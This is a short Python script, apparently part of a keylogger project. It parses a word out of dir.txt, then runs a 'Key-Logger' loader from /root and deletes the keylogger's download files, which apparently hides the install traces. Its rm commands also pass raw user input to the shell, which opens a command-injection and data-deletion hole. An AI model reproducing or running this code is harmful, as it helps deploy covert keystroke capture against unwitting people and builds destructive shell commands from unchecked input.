import subprocess

s = "F"
DIR = input("Download-directory:")
print("")

""" File to string """

file = open("dir.txt", 'r')
read = file.readlines()
file.close()

data = "".join(read)

count = 0
ok = 0

""" Serch the Word """

while ok < 1:
    index = data[count]
    count  += 1
    
    if index == s:
        one = count + 4
        ok = 1

count  += 4
stop = "false"        
liste = []

while stop == "false":
    index = data[count]
    liste.append(index)
    count  += 1
    if index == "$":
        stop = "true"
        
""" Outputs the Word """

output = "".join(liste)
output = output.replace("$", '')
print(output)

subprocess.check_call("python3 /root/Key-Logger/load-In.py", shell=True)

subprocess.check_call("rm " + DIR + "KeyL", shell=True)

subprocess.check_call("rm -r " + DIR + "Key-Logger", shell=True)
